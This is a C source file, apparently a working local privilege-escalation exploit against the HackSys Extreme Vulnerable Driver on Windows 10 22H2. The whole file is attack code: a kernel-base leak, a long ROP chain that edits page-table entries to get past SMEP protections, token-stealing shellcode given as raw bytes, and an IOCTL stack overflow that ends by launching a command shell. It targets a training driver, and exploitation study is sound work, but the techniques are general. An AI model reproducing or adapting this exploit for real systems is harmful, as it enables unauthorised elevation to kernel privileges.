/**
 * Author     :    @gh057mz
 * Environment:   Windows 10 Version 22H2 (OS Build 19045.2965)
 */


#include <windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdint.h>

#define TriggerBufferOverflowStack_IOCTL 0x222003


// https://github.com/gh057mz/Common-kExp-code-snippets/blob/main/Get%20kernel%20base%20address%20medium%20integrity.c
uint64_t get_kernel_base_2(){

    #define MAX_DRIVERS 1024
    #define BUFFER_SIZE 1024

	HMODULE base[MAX_DRIVERS];
    DWORD cbNeeded;
    BOOL success;
    char driverName[BUFFER_SIZE];
    int i;

    success = EnumDeviceDrivers((LPVOID *)base, sizeof(base), &cbNeeded);

    if (!success) {
        printf("- EnumDeviceDrivers() function call failed!\n");
        exit(-1);
    }

    for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
        if (base[i] == NULL) {
            continue;
        }

        memset(driverName, 0, sizeof(driverName));

        DWORD result = GetDeviceDriverBaseNameA(
            base[i],             
            driverName,           
            sizeof(driverName)   
        );

        if (result == 0) {

            printf("- GetDeviceDriverBaseNameA() function call failed!\n");
            exit(-1);
        }

        if (strstr(strlwr(driverName), "ntoskrnl.exe") != NULL) {
            
            return (uint64_t)base[i];
            break;
        }
    }
}


int main(){

    HANDLE hHEVD = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        printf("* Driver handle: 0x%p\n", hHEVD);    
    uint64_t kernel_base = get_kernel_base_2();
        printf("* Kernel base:   0x%p\n", kernel_base);


    unsigned char payload[] = {
        0x65, 0x48, 0x8b, 0x14, 0x25, 0x88, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x82,
        0xb8, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x88, 0x48, 0x04, 0x00, 0x00, 0x48,
        0x8b, 0x51, 0xf8, 0x48, 0x83, 0xfa, 0x04, 0x74, 0x05, 0x48, 0x8b, 0x09,
        0xeb, 0xf1, 0x48, 0x8b, 0x41, 0x70, 0x24, 0xf0, 0x49, 0x89, 0x80, 0xb8,
        0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
        0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89,
        0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00,
        0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01,
        0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa,
        0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
    }; size_t payload_size = sizeof(payload);


    // Moving the shellcode payload to the exploit.exe's heap
    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    LPVOID shellcode_addr = HeapAlloc(hHeap, 0, payload_size + 1);
    DWORD oldProtect;
    VirtualProtect(shellcode_addr, payload_size + 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    RtlMoveMemory(shellcode_addr, payload, payload_size);
    

    char user_buffer[3000];
    size_t user_buffer_size = sizeof(user_buffer);
    RtlFillMemory(user_buffer, 2072, 0x41);


    printf("* User buffer address: %p\n", user_buffer);
    printf("* Shellcode address:   %p\n", shellcode_addr);    
    

    // Gadgets
        uint64_t pop_rcx_gadget            = kernel_base + 0x5eb0a7;
        uint64_t pop_r8_gadget             = kernel_base + 0x522463;
        uint64_t pop_rax_gadget            = kernel_base + 0x5e4fb2;
        
        uint64_t and_rcx_rax_gadget        = kernel_base + 0x564290;
        uint64_t shl_rax_0x03_gadget       = kernel_base + 0x6e427f;
        uint64_t shr_rax_0x0c_gadget       = kernel_base + 0x64c648;

        uint64_t sub_rax_rcx_gadget        = kernel_base + 0x6a42c6;
        uint64_t add_rcx_r9_gadget         = kernel_base + 0x5cdd03;

        uint64_t wbinvd_gadget             = kernel_base + 0x381af0;

        uint64_t MiGetPteAddress_addr      = kernel_base + 0x00230160;
        uint64_t MiGetPteAddress_0x13_addr = kernel_base + 0x00230173;

        uint64_t mov_rdx_rax_gadget        = kernel_base + 0x003cdbb6;
        uint64_t mov_rax_raxValue_gadget   = kernel_base + 0x9c4fb6;
        uint64_t mov_rdx_value_rax_gadget  = kernel_base + 0x63f1df;
        uint64_t mov_r8_rdx_gadget         = kernel_base + 0x785778;
        uint64_t mov_rcx_r8_gadget         = kernel_base + 0x93fe5a;
        uint64_t mov_r9_r8_gadgets         = kernel_base + 0x9dc18e;
        uint64_t mov_rax_rcx_gadget        = kernel_base + 0x6c7682;


    // This buffer is used to avoid an access vioaltion in the ROP Chain. `mov [r8], edx`
    LPVOID temp_buffer = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    uint64_t rop = (uint64_t)user_buffer + 2072;
    int index = 0;

    // Loading the address of temp_buffer into R8
    *(uint64_t*)(rop + index) =     pop_r8_gadget                                               ; index += 8;       
    *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer                                       ; index += 8; 


    // Finding the address of the PTE
        
        // MiGetPteAddress function
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     (uint64_t)shellcode_addr    ; index += 8;   
            // SHR RAX >> 9 
            *(uint64_t*)(rop + index) =     shr_rax_0x0c_gadget         ; index += 8;   
            *(uint64_t*)(rop + index) =     shl_rax_0x03_gadget         ; index += 8;   
            // MOV RAX, RCX 
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_rcx_r8_gadget           ; index += 8;   
            // AND RCX, RAX 
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     0x7FFFFFFFF8                ; index += 8;   
            *(uint64_t*)(rop + index) =     and_rcx_rax_gadget          ; index += 8; 
            // MOV RAX, [MiGetPteAddress + 0x13]    
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     MiGetPteAddress_0x13_addr   ; index += 8;       
            *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget     ; index += 8;   
    
                // Avoid access violation
                *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
                *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 

            // MOV R9, RAX
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r9_r8_gadgets           ; index += 8;   

            // ADD RCX, R9 - PTE ADDRESS in RCX
            *(uint64_t*)(rop + index) =     add_rcx_r9_gadget           ; index += 8; 
            
    
    // Finding the address of the PDE
        
        // Avoid access violation
        *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
        *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 
        // Move address of PTE into RAX
        *(uint64_t*)(rop + index) =     mov_rax_rcx_gadget              ; index += 8; 
        
        // MiGetPteAddress function
            // SHR RAX >> 9 
            *(uint64_t*)(rop + index) =     shr_rax_0x0c_gadget         ; index += 8;   
            *(uint64_t*)(rop + index) =     shl_rax_0x03_gadget         ; index += 8;   
            // MOV RAX, RCX 
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_rcx_r8_gadget           ; index += 8;   
            // AND RCX, RAX 
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     0x7FFFFFFFF8                ; index += 8;   
            *(uint64_t*)(rop + index) =     and_rcx_rax_gadget          ; index += 8; 
            // MOV RAX, [MiGetPteAddress + 0x13]    
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     MiGetPteAddress_0x13_addr   ; index += 8;       
            *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget     ; index += 8;   
    
                // Avoid access violation
                *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
                *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 

            // MOV R9, RAX
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r9_r8_gadgets           ; index += 8;   
            // ADD RCX, R9 - PDE ADDRESS in RCX
            *(uint64_t*)(rop + index) =     add_rcx_r9_gadget           ; index += 8; 

    // Finding the address of the PPE
        
        // Avoid access violation
        *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
        *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 
        // Move address of PTE into RAX
        *(uint64_t*)(rop + index) =     mov_rax_rcx_gadget              ; index += 8; 
        
        // MiGetPteAddress function
            // SHR RAX >> 9 
            *(uint64_t*)(rop + index) =     shr_rax_0x0c_gadget         ; index += 8;   
            *(uint64_t*)(rop + index) =     shl_rax_0x03_gadget         ; index += 8;   
            // MOV RAX, RCX 
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_rcx_r8_gadget           ; index += 8;   
            // AND RCX, RAX 
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     0x7FFFFFFFF8                ; index += 8;   
            *(uint64_t*)(rop + index) =     and_rcx_rax_gadget          ; index += 8; 
            // MOV RAX, [MiGetPteAddress + 0x13]    
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     MiGetPteAddress_0x13_addr   ; index += 8;       
            *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget     ; index += 8;   
    
                // Avoid access violation
                *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
                *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 

            // MOV R9, RAX
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r9_r8_gadgets           ; index += 8;   
            // ADD RCX, R9 - PPE ADDRESS in RCX
            *(uint64_t*)(rop + index) =     add_rcx_r9_gadget           ; index += 8; 


    // Finding the address of the PXE (PML4)
        
        // Avoid access violation
        *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
        *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 
        // Move address of PPE into RAX
        *(uint64_t*)(rop + index) =     mov_rax_rcx_gadget              ; index += 8; 
        
        // MiGetPteAddress function
            // SHR RAX >> 9 
            *(uint64_t*)(rop + index) =     shr_rax_0x0c_gadget         ; index += 8;   
            *(uint64_t*)(rop + index) =     shl_rax_0x03_gadget         ; index += 8;   
            // MOV RAX, RCX 
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_rcx_r8_gadget           ; index += 8;   
            // AND RCX, RAX 
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     0x7FFFFFFFF8                ; index += 8;   
            *(uint64_t*)(rop + index) =     and_rcx_rax_gadget          ; index += 8; 
            // MOV RAX, [MiGetPteAddress + 0x13]    
            *(uint64_t*)(rop + index) =     pop_rax_gadget              ; index += 8;   
            *(uint64_t*)(rop + index) =     MiGetPteAddress_0x13_addr   ; index += 8;       
            *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget     ; index += 8;   
    
                // Avoid access violation
                *(uint64_t*)(rop + index) =     pop_r8_gadget                   ; index += 8;       
                *(uint64_t*)(rop + index) =     (uint64_t)temp_buffer           ; index += 8; 
    
            // MOV R9, RAX
            *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget          ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r8_rdx_gadget           ; index += 8;   
            *(uint64_t*)(rop + index) =     mov_r9_r8_gadgets           ; index += 8;   
            // ADD RCX, R9 - PXE ADDRESS in RCX
            *(uint64_t*)(rop + index) =     add_rcx_r9_gadget           ; index += 8; 

    // Modifying Supervisor and Execute bit at PXE
        // MOV RAX, RCX
        *(uint64_t*)(rop + index) =     mov_rax_rcx_gadget              ; index += 8; 
        // Back up PXE address in RDX
        *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget              ; index += 8;   
        // Get value at PXE
        *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget         ; index += 8;   
        *(uint64_t*)(rop + index) =     pop_rcx_gadget                  ; index += 8;   
        // Subtract 0x04, sets Supervisor bit
        *(uint64_t*)(rop + index) =     0x4                             ; index += 8;   
        *(uint64_t*)(rop + index) =     sub_rax_rcx_gadget              ; index += 8; 
        // Subtract 0x8000000000000000, sets Executable bit
        *(uint64_t*)(rop + index) =     pop_rcx_gadget                  ; index += 8;   
        *(uint64_t*)(rop + index) =     0x8000000000000000              ; index += 8;   
        *(uint64_t*)(rop + index) =     sub_rax_rcx_gadget              ; index += 8;   
        // Modify the PXE value by moving new calculated value
        *(uint64_t*)(rop + index) =     mov_rdx_value_rax_gadget        ; index += 8;   

    // Modifying Supervisor bit at PTE
        *(uint64_t*)(rop + index) =     pop_rcx_gadget                      ; index += 8;   
        *(uint64_t*)(rop + index) =     (uint64_t)shellcode_addr            ; index += 8;   
        *(uint64_t*)(rop + index) =     MiGetPteAddress_addr                ; index += 8;   
        *(uint64_t*)(rop + index) =     mov_rdx_rax_gadget                  ; index += 8;   
        *(uint64_t*)(rop + index) =     mov_rax_raxValue_gadget             ; index += 8;   
        *(uint64_t*)(rop + index) =     pop_rcx_gadget                      ; index += 8;   
        *(uint64_t*)(rop + index) =     0x4                                 ; index += 8;   
        *(uint64_t*)(rop + index) =     sub_rax_rcx_gadget                  ; index += 8;   
        *(uint64_t*)(rop + index) =     mov_rdx_value_rax_gadget            ; index += 8;   

    // Clear TLB Cache
    *(uint64_t*)(rop + index)     =     wbinvd_gadget                           ; index += 8;   
    // Call shellcode
    *(uint64_t*)(rop + index)     =     (uint64_t)shellcode_addr                ; index += 8;   


    printf("* Invoking TriggerBufferOverflowStack_IOCTL...\n");
    system("pause");

    DeviceIoControl(hHEVD, TriggerBufferOverflowStack_IOCTL, user_buffer, user_buffer_size, NULL, 0, 0, NULL);

    system("start cmd");
    system("pause");

}
